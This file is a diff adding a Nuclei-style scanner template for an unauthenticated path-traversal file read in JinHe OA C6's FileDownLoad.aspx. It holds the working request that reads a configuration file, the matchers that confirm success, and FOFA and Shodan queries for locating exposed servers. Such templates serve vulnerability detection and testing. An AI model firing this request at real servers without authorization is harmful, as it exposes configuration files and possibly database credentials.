@@ -1,0 +1,33 @@
+id: jinher-oa-c6-filedownload-lfi
+
+info:
+  name: 金和 OA c6 FileDownLoad.aspx - Local File Inclusion
+  author: leadlife
+  severity: high
+  description: JinHe OA C6 FileDownLoad.aspx interface exists an arbitrary file read vulnerability, unauthenticated attackers can read important system files (such as database configuration files, system configuration files), database configuration files, etc., causing the website to be in an extremely insecure state.
+  reference:
+    - todo
+  metadata:
+    verified: true
+    fofa-query: body="/jc6/platform/sys/login" || body="JHSoft.Web.AddMenu" || app="金和网络-金和OA" || "JC6金和协同管理平台"
+    shodan-query: 'http.html:"/jc6/platform/sys/login"'
+  tags: jinher,lfi,oa
+
+http:
+  - raw:
+      - |
+        GET /c6/JHSoft.Web.CustomQuery/FileDownLoad.aspx?FilePath=../Resource/JHFileConfig.ini HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      
+      - type: word
+        part: body
+        words:
+          - "[JHFile]"
+          - "FolderTotal"
+        condition: and
